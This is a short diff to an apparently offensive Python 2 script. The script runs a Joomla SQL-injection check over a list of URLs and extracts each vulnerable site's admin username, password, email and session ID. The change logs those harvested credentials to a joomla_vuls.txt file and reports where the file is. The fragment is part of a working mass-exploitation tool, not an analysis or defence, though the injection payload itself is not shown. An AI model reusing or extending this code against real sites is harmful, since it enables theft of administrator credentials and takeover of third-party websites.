@@ -338,6 +338,10 @@ def checkJoomla(value):
             if url.strip():
                 checkJoomlaSQLi(url)
     	urlfile.close()
+    output = os.path.dirname(os.path.realpath(__file__))+"/joomla_vuls.txt"
+    if os.path.exists(output):
+        print "\n[INFO] Scanned Vuls:"
+        print "[*] Output File: "+output
     
 def checkJoomlaSQLi(url):    
     url = url.strip()
@@ -350,7 +354,9 @@ def checkJoomlaSQLi(url):
             password = getInfoByJoomlaSQLi(url, 'password')
             email = getInfoByJoomlaSQLi(url, 'email')
             session_id = getInfoByJoomlaSQLi(url, 'session_id')
-            print '[+] vuls found! url: '+url+', admin: '+username+', password: '+password+', email: '+email+', session_id: '+session_id 
+            vuls='[+] vuls found! url: '+url+', admin: '+username+', password: '+password+', email: '+email+', session_id: '+session_id
+            logfile(vuls,'joomla_vuls.txt')
+            print vuls
         else:
             print '[!] no vuls! url: '+url
     except Exception,e:
